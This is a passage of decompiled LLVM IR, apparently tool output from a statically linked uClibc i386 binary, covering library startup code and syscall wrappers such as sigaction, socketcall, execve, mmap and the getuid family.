  %v3_8051b45 = add i32 %v3_8051b12, 32
  br label %dec_label_pc_8051b3a

dec_label_pc_8051b3a:                             ; preds = %dec_label_pc_8051b3a.lr.ph, %dec_label_pc_8051b52
  %v1_8051b45 = phi i32 [ %v2_8051b552, %dec_label_pc_8051b3a.lr.ph ], [ %v2_8051b55, %dec_label_pc_8051b52 ]
  %v0_8051b44 = phi i32 [ %v1_8051b31, %dec_label_pc_8051b3a.lr.ph ], [ %v1_8051b52, %dec_label_pc_8051b52 ]
  %v6_8051b3f = icmp ugt i32 %v1_8051b45, 14
  br i1 %v6_8051b3f, label %dec_label_pc_8051b52, label %dec_label_pc_8051b41

dec_label_pc_8051b41:                             ; preds = %dec_label_pc_8051b3a
  %v0_8051b41 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051b41, i32* %stack_var_-160, align 4
  store i32 %v0_8051b44, i32* %stack_var_-168, align 4
  %v2_8051b45 = mul i32 %v1_8051b45, 8
  %v4_8051b45 = add i32 %v3_8051b45, %v2_8051b45
  %v3_8051b4a = inttoptr i32 %v4_8051b45 to i16*
  %v4_8051b4a = call i32 @memcpy(i16* %v3_8051b4a, i32 %v0_8051b44, i32 8)
  %v0_8051b52.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b52

dec_label_pc_8051b52:                             ; preds = %dec_label_pc_8051b3a, %dec_label_pc_8051b41
  %v0_8051b52 = phi i32 [ %v0_8051b44, %dec_label_pc_8051b3a ], [ %v0_8051b52.pre, %dec_label_pc_8051b41 ]
  %v1_8051b52 = add i32 %v0_8051b52, 8
  store i32 %v1_8051b52, i32* @ebx, align 4
  %v1_8051b55 = inttoptr i32 %v1_8051b52 to i32*
  %v2_8051b55 = load i32, i32* %v1_8051b55, align 4
  %v3_8051b55 = icmp eq i32 %v2_8051b55, 0
  %v1_8051b58 = icmp eq i1 %v3_8051b55, false
  br i1 %v1_8051b58, label %dec_label_pc_8051b3a, label %dec_label_pc_8051b5a

dec_label_pc_8051b5a:                             ; preds = %dec_label_pc_8051b52, %dec_label_pc_8051b55.preheader
  store i32 %v2_8051b1c, i32* @eax, align 4
  %v0_8051b5e = call i32 @_dl_aux_init()
  store i32 %v0_8051b5e, i32* @eax, align 4
  %v0_8051b63 = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_8051b71 = icmp eq i32 %tmp24, 0
  %v3_8051b73 = select i1 %v1_8051b71, i32 4096, i32 %tmp24
  %v13_8051b76 = icmp eq i32 %tmp23, -1
  store i32 %v3_8051b73, i32* @global_var_805e710.141, align 16
  %v1_8051b80 = icmp eq i1 %v13_8051b76, false
  br i1 %v1_8051b80, label %dec_label_pc_8051bab, label %dec_label_pc_8051b82

dec_label_pc_8051b82:                             ; preds = %dec_label_pc_8051b5a
  %v0_8051b82 = call i32 @getuid()
  store i32 %v0_8051b82, i32* @ebx, align 4
  %v0_8051b89 = call i32 @geteuid()
  %v0_8051b8e = load i32, i32* @ebx, align 4
  %v12_8051b8e = icmp eq i32 %v0_8051b8e, %v0_8051b89
  %v1_8051b90 = icmp eq i1 %v12_8051b8e, false
  br i1 %v1_8051b90, label %dec_label_pc_8051bc1, label %dec_label_pc_8051b92

dec_label_pc_8051b92:                             ; preds = %dec_label_pc_8051b82
  %v0_8051b92 = call i32 @getgid()
  store i32 %v0_8051b92, i32* @ebx, align 4
  %v0_8051b99 = call i32 @getegid()
  %v0_8051b9e = load i32, i32* @ebx, align 4
  %v12_8051b9e = icmp eq i32 %v0_8051b9e, %v0_8051b99
  %v1_8051ba0 = icmp eq i1 %v12_8051b9e, false
  br i1 %v1_8051ba0, label %dec_label_pc_8051bc1, label %dec_label_pc_8051ba2.thread

dec_label_pc_8051ba2.thread:                      ; preds = %dec_label_pc_8051b92
  br label %dec_label_pc_8051beb

dec_label_pc_8051bab:                             ; preds = %dec_label_pc_8051b5a
  %v15_8051bab = icmp eq i32 %tmp23, %tmp22
  %v1_8051baf = icmp eq i1 %v15_8051bab, false
  br i1 %v1_8051baf, label %dec_label_pc_8051bc1, label %dec_label_pc_8051bb1

dec_label_pc_8051bb1:                             ; preds = %dec_label_pc_8051bab
  br label %dec_label_pc_8051bc1

dec_label_pc_8051bc1:                             ; preds = %dec_label_pc_8051bb1, %dec_label_pc_8051bab, %dec_label_pc_8051b92, %dec_label_pc_8051b82
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051bc8 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051bd7 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051be6 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051beb

dec_label_pc_8051beb:                             ; preds = %dec_label_pc_8051ba2.thread, %dec_label_pc_8051bc1
  %v0_8051beb = load i32, i32* @edi, align 4
  %v1_8051beb = inttoptr i32 %v0_8051beb to i32*
  %v2_8051beb = load i32, i32* %v1_8051beb, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8051beb, i32* inttoptr (i32 134579320 to i32*), align 8
  store i32 %arg5, i32* @global_var_805e714.213, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 0), label %dec_label_pc_8051c10, label %dec_label_pc_8051c1c

dec_label_pc_8051c10:                             ; preds = %dec_label_pc_8051beb, %dec_label_pc_8051c10
  %v4_8051c1052 = phi i32 [ %v1_8051c17, %dec_label_pc_8051c10 ], [ 0, %dec_label_pc_8051beb ]
  store i32 ptrtoint (i32* @global_var_8051c17.219 to i32), i32* %stack_var_-160, align 4
  %v5_8051c10 = mul i32 %v4_8051c1052, 4
  %v6_8051c10 = add i32 %v5_8051c10, ptrtoint (i32* @global_var_8058000.211 to i32)
  %v7_8051c10 = inttoptr i32 %v6_8051c10 to i32*
  %v8_8051c10 = load i32, i32* %v7_8051c10, align 4
  call void @__pseudo_call(i32 %v8_8051c10)
  %v0_8051c17 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c17 = add i32 %v0_8051c17, 1
  store i32 %v1_8051c17, i32* %ebx.global-to-local, align 4
  %v1_8051c18 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051c18 = icmp ult i32 %v1_8051c17, %v1_8051c18
  br i1 %v7_8051c18, label %dec_label_pc_8051c10, label %dec_label_pc_8051c1c

dec_label_pc_8051c1c:                             ; preds = %dec_label_pc_8051c10, %dec_label_pc_8051beb
  store i32 134552610, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 0), label %dec_label_pc_8051c34, label %dec_label_pc_8051c40

dec_label_pc_8051c34:                             ; preds = %dec_label_pc_8051c1c, %dec_label_pc_8051c34
  %v4_8051c3442 = phi i32 [ %v1_8051c3b, %dec_label_pc_8051c34 ], [ 0, %dec_label_pc_8051c1c ]
  store i32 ptrtoint (i32* @global_var_8051c3b.220 to i32), i32* %stack_var_-160, align 4
  %v5_8051c34 = mul i32 %v4_8051c3442, 4
  %v6_8051c34 = add i32 %v5_8051c34, ptrtoint (i32* @global_var_8058000.211 to i32)
  %v7_8051c34 = inttoptr i32 %v6_8051c34 to i32*
  %v8_8051c34 = load i32, i32* %v7_8051c34, align 4
  call void @__pseudo_call(i32 %v8_8051c34)
  %v0_8051c3b = load i32, i32* @ebx, align 4
  %v1_8051c3b = add i32 %v0_8051c3b, 1
  store i32 %v1_8051c3b, i32* @ebx, align 4
  %v1_8051c3c.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051c3c = icmp ult i32 %v1_8051c3b, %v1_8051c3c.pre
  br i1 %v7_8051c3c, label %dec_label_pc_8051c34, label %dec_label_pc_8051c40

dec_label_pc_8051c40:                             ; preds = %dec_label_pc_8051c34, %dec_label_pc_8051c1c
  %v0_8051c49 = load i32, i32* %stack_var_-160, align 4
  %v1_8051c49 = call i32 @__errno_location(i32 %v0_8051c49)
  %v1_8051c4e = inttoptr i32 %v1_8051c49 to i32*
  store i32 0, i32* %v1_8051c4e, align 4
  %v0_8051c5d = call i32 @__GI___h_errno_location()
  store i32 %v0_8051c5d, i32* @eax, align 4
  %v1_8051c62 = inttoptr i32 %v0_8051c5d to i32*
  store i32 0, i32* %v1_8051c62, align 4
  %v0_8051c68 = load i32, i32* @eax, align 4
  store i32 %v0_8051c68, i32* %stack_var_-160, align 4
  %v0_8051c6f = load i32, i32* @edi, align 4
  store i32 %v0_8051c6f, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8051c7e = load i32, i32* @eax, align 4
  %v1_8051c81 = call i32 @__GI_exit(i32 %v0_8051c7e)
  %v0_8051c8d = load i32, i32* @ebx, align 4
  %v1_8051c8d = inttoptr i32 %v0_8051c8d to %sigcontext*
  %v2_8051c8d = call i32 @sigreturn(%sigcontext* %v1_8051c8d)
  %v0_8051c95 = load i32, i32* @ebx, align 4
  %v1_8051c95 = inttoptr i32 %v0_8051c95 to %sigcontext*
  %v2_8051c95 = call i32 @sigreturn(%sigcontext* %v1_8051c95)
  ret i32 %v2_8051c95

; uselistorder directives
  uselistorder i32 %v1_8051c3b, { 1, 2, 0 }
  uselistorder i32 %v1_8051c17, { 1, 2, 0 }
  uselistorder i32 %v2_8051b55, { 1, 0 }
  uselistorder i32 %v1_8051b52, { 2, 1, 0 }
  uselistorder i32 %v1_8051b31, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051b2e, { 1, 0 }
  uselistorder i32 %v1_8051b05, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051c34, { 1, 0 }
  uselistorder label %dec_label_pc_8051c10, { 1, 0 }
  uselistorder label %dec_label_pc_8051beb, { 1, 0 }
  uselistorder label %dec_label_pc_8051b52, { 1, 0 }
  uselistorder label %dec_label_pc_8051b3a, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051c97 = load i32, i32* @esi, align 4
  %v0_8051c98 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051cad = icmp eq i32* %arg2, null
  br i1 %v1_8051cad, label %dec_label_pc_8051d01, label %dec_label_pc_8051cb1

dec_label_pc_8051cb1:                             ; preds = %entry
  %v2_8051cb1 = load i32, i32* %arg2, align 4
  store i32 %v2_8051cb1, i32* %stack_var_-148, align 4
  %v1_8051cba = add i32 %tmp11, 4
  %v3_8051ccc = bitcast i32* %stack_var_-136 to i16*
  %v4_8051ccc = call i32 @memcpy(i16* %v3_8051ccc, i32 %v1_8051cba, i32 128)
  br label %dec_label_pc_8051d01

dec_label_pc_8051d01:                             ; preds = %entry, %dec_label_pc_8051cb1
  %v1_8051d03 = icmp eq i32 %arg3, 0
  br i1 %v1_8051d03, label %dec_label_pc_8051d0b, label %dec_label_pc_8051d07

dec_label_pc_8051d07:                             ; preds = %dec_label_pc_8051d01
  %v2_8051d07 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051d0b

dec_label_pc_8051d0b:                             ; preds = %dec_label_pc_8051d01, %dec_label_pc_8051d07
  %v0_8051d1a = phi i32 [ 0, %dec_label_pc_8051d01 ], [ %v2_8051d07, %dec_label_pc_8051d07 ]
  br i1 %v1_8051cad, label %dec_label_pc_8051d18, label %dec_label_pc_8051d11

dec_label_pc_8051d11:                             ; preds = %dec_label_pc_8051d0b
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8051d18

dec_label_pc_8051d18:                             ; preds = %dec_label_pc_8051d0b, %dec_label_pc_8051d11
  %v0_8051d1b = phi %sigaction* [ null, %dec_label_pc_8051d0b ], [ %phitmp, %dec_label_pc_8051d11 ]
  %v5_8051d23 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8051d1b, i32 %v0_8051d1a, i32 8)
  store i32 %v5_8051d23, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051d03, label %dec_label_pc_8051d66, label %dec_label_pc_8051d31

dec_label_pc_8051d31:                             ; preds = %dec_label_pc_8051d18
  %v2_8051d31 = icmp slt i32 %v5_8051d23, 0
  br i1 %v2_8051d31, label %dec_label_pc_8051d66, label %dec_label_pc_8051d35

dec_label_pc_8051d35:                             ; preds = %dec_label_pc_8051d31
  %v3_8051d35 = load i32, i32* %stack_var_-288, align 4
  %v2_8051d39 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051d35, i32* %v2_8051d39, align 4
  %v2_8051d41 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051d46 = add i32 %arg3, 4
  %v3_8051d4a = inttoptr i32 %v1_8051d46 to i16*
  %v4_8051d4a = call i32 @memcpy(i16* %v3_8051d4a, i32 %v2_8051d41, i32 128)
  %v2_8051d53 = add i32 %arg3, 132
  %v3_8051d53 = inttoptr i32 %v2_8051d53 to i32*
  %v2_8051d60 = add i32 %arg3, 136
  %v3_8051d60 = inttoptr i32 %v2_8051d60 to i32*
  %v0_8051d6c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051d66

dec_label_pc_8051d66:                             ; preds = %dec_label_pc_8051d18, %dec_label_pc_8051d31, %dec_label_pc_8051d35
  %v0_8051d6c = phi i32 [ %v5_8051d23, %dec_label_pc_8051d18 ], [ %v5_8051d23, %dec_label_pc_8051d31 ], [ %v0_8051d6c.pre, %dec_label_pc_8051d35 ]
  store i32 %v0_8051c98, i32* @ebx, align 4
  store i32 %v0_8051c97, i32* @esi, align 4
  ret i32 %v0_8051d6c

; uselistorder directives
  uselistorder i1 %v1_8051d03, { 1, 0 }
  uselistorder i1 %v1_8051cad, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051d66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051d18, { 1, 0 }
  uselistorder label %dec_label_pc_8051d0b, { 1, 0 }
  uselistorder label %dec_label_pc_8051d01, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8051d77 = load i32, i32* @eax, align 4
  %v1_8051d79 = sub i32 0, %v0_8051d77
  %v1_8051d7b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8051d80 = inttoptr i32 %v1_8051d7b to i32*
  store i32 %v1_8051d79, i32* %v2_8051d80, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051d8c = load i32, i32* @ebx, align 4
  %v2_8051d93 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8051d93, i32* @ebx, align 4
  %v8_8051d97 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051d8c, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8051d97, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134552948)
  ret i32 %v8_8051d97

; uselistorder directives
  uselistorder i32 %v8_8051d97, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134552948, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051da8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051da8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051dbb = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051dbb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051dbb, -4095
  br i1 %tmp, label %dec_label_pc_8051dd4, label %dec_label_pc_8051dc8

dec_label_pc_8051dc8:                             ; preds = %entry
  %v0_8051dc8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051dc8 = call i32 @__errno_location(i32 %v0_8051dc8)
  %v0_8051dcd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051dcd = sub i32 0, %v0_8051dcd
  %v2_8051dcf = inttoptr i32 %v1_8051dc8 to i32*
  store i32 %v1_8051dcd, i32* %v2_8051dcf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051dd4

dec_label_pc_8051dd4:                             ; preds = %entry, %dec_label_pc_8051dc8
  %v0_8051dd5 = phi i32 [ %v1_8051dbb, %entry ], [ -1, %dec_label_pc_8051dc8 ]
  %v2_8051dd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051dd4, i32* @edx, align 4
  %v2_8051dd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051dd8, i32* @ebx, align 4
  ret i32 %v0_8051dd5

; uselistorder directives
  uselistorder i32 %v1_8051dbb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051dd4, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ddd = load i32, i32* @esi, align 4
  store i32 %v0_8051ddd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051df1 = load i32, i32* @ebx, align 4
  %v7_8051df9 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051df9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8051df9, -4095
  br i1 %tmp, label %dec_label_pc_8051e11, label %dec_label_pc_8051e05

dec_label_pc_8051e05:                             ; preds = %entry
  %v1_8051e05 = call i32 @__errno_location(i32 %v0_8051df1)
  %v0_8051e0a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e0a = sub i32 0, %v0_8051e0a
  %v2_8051e0c = inttoptr i32 %v1_8051e05 to i32*
  store i32 %v1_8051e0a, i32* %v2_8051e0c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051e11

dec_label_pc_8051e11:                             ; preds = %entry, %dec_label_pc_8051e05
  %v0_8051e12 = phi i32 [ %v7_8051df9, %entry ], [ -1, %dec_label_pc_8051e05 ]
  %v2_8051e14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051e14, i32* @esi, align 4
  ret i32 %v0_8051e12

; uselistorder directives
  uselistorder i32 %v7_8051df9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e11, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e18 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051e2b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051e2b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051e2b, -4095
  br i1 %tmp, label %dec_label_pc_8051e44, label %dec_label_pc_8051e38

dec_label_pc_8051e38:                             ; preds = %entry
  %v0_8051e38 = load i32, i32* %stack_var_-4, align 4
  %v1_8051e38 = call i32 @__errno_location(i32 %v0_8051e38)
  %v0_8051e3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051e3d = sub i32 0, %v0_8051e3d
  %v2_8051e3f = inttoptr i32 %v1_8051e38 to i32*
  store i32 %v1_8051e3d, i32* %v2_8051e3f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051e44

dec_label_pc_8051e44:                             ; preds = %entry, %dec_label_pc_8051e38
  %v0_8051e45 = phi i32 [ %v4_8051e2b, %entry ], [ -1, %dec_label_pc_8051e38 ]
  %v2_8051e44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051e44, i32* @edx, align 4
  %v2_8051e48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051e48, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051e45

; uselistorder directives
  uselistorder i32 %v4_8051e2b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e44, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e4c = load i32, i32* @edi, align 4
  store i32 %v0_8051e4c, i32* %stack_var_-4, align 4
  %v4_8051e50 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051e50, i32* %edi.global-to-local, align 4
  %v0_8051e5c = load i32, i32* @ebx, align 4
  %v5_8051e64 = insertvalue [1 x i8*] undef, i8* %tmp6, 0
  %v8_8051e64 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8051e64 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8051e64, [1 x i8*] %v8_8051e64)
  store i32 %v9_8051e64, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v9_8051e64, -4095
  br i1 %tmp13, label %dec_label_pc_8051e7c, label %dec_label_pc_8051e70

dec_label_pc_8051e70:                             ; preds = %entry
  %v1_8051e70 = call i32 @__errno_location(i32 %v0_8051e5c)
  %v0_8051e75 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051e75 = sub i32 0, %v0_8051e75
  %v2_8051e77 = inttoptr i32 %v1_8051e70 to i32*
  store i32 %v1_8051e75, i32* %v2_8051e77, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051e7c

dec_label_pc_8051e7c:                             ; preds = %entry, %dec_label_pc_8051e70
  %v0_8051e7d = phi i32 [ %v9_8051e64, %entry ], [ -1, %dec_label_pc_8051e70 ]
  %v2_8051e80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051e80, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051e7d

; uselistorder directives
  uselistorder i32 %v9_8051e64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e7c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e84 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e84, i32* %stack_var_-4, align 4
  %v1_8051e8d = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051e8d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051e8d, -4095
  br i1 %tmp, label %dec_label_pc_8051ea4, label %dec_label_pc_8051e98

dec_label_pc_8051e98:                             ; preds = %entry
  %v0_8051e98 = load i32, i32* %stack_var_-4, align 4
  %v1_8051e98 = call i32 @__errno_location(i32 %v0_8051e98)
  %v0_8051e9d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051e9d = sub i32 0, %v0_8051e9d
  %v2_8051e9f = inttoptr i32 %v1_8051e98 to i32*
  store i32 %v1_8051e9d, i32* %v2_8051e9f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ea4

dec_label_pc_8051ea4:                             ; preds = %entry, %dec_label_pc_8051e98
  %v0_8051ea5 = phi i32 [ %v1_8051e8d, %entry ], [ -1, %dec_label_pc_8051e98 ]
  %v2_8051ea8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ea8, i32* @ebx, align 4
  ret i32 %v0_8051ea5

; uselistorder directives
  uselistorder i32 %v1_8051e8d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ea4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051eac = load i32, i32* @ebx, align 4
  store i32 %v0_8051eac, i32* %stack_var_-4, align 4
  %v1_8051eb5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051eb5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051eb5, -4095
  br i1 %tmp, label %dec_label_pc_8051ecc, label %dec_label_pc_8051ec0

dec_label_pc_8051ec0:                             ; preds = %entry
  %v0_8051ec0 = load i32, i32* %stack_var_-4, align 4
  %v1_8051ec0 = call i32 @__errno_location(i32 %v0_8051ec0)
  %v0_8051ec5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ec5 = sub i32 0, %v0_8051ec5
  %v2_8051ec7 = inttoptr i32 %v1_8051ec0 to i32*
  store i32 %v1_8051ec5, i32* %v2_8051ec7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ecc

dec_label_pc_8051ecc:                             ; preds = %entry, %dec_label_pc_8051ec0
  %v0_8051ecd = phi i32 [ %v1_8051eb5, %entry ], [ -1, %dec_label_pc_8051ec0 ]
  %v2_8051ed0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ed0, i32* @ebx, align 4
  ret i32 %v0_8051ecd

; uselistorder directives
  uselistorder i32 %v1_8051eb5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ecc, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ed4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ed4, i32* %stack_var_-4, align 4
  %v1_8051edd = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051edd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051edd, -4095
  br i1 %tmp, label %dec_label_pc_8051ef4, label %dec_label_pc_8051ee8

dec_label_pc_8051ee8:                             ; preds = %entry
  %v0_8051ee8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051ee8 = call i32 @__errno_location(i32 %v0_8051ee8)
  %v0_8051eed = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051eed = sub i32 0, %v0_8051eed
  %v2_8051eef = inttoptr i32 %v1_8051ee8 to i32*
  store i32 %v1_8051eed, i32* %v2_8051eef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ef4

dec_label_pc_8051ef4:                             ; preds = %entry, %dec_label_pc_8051ee8
  %v0_8051ef5 = phi i32 [ %v1_8051edd, %entry ], [ -1, %dec_label_pc_8051ee8 ]
  %v2_8051ef8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ef8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ef5

; uselistorder directives
  uselistorder i32 %v1_8051edd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ef4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051efc = load i32, i32* @ebx, align 4
  store i32 %v0_8051efc, i32* %stack_var_-4, align 4
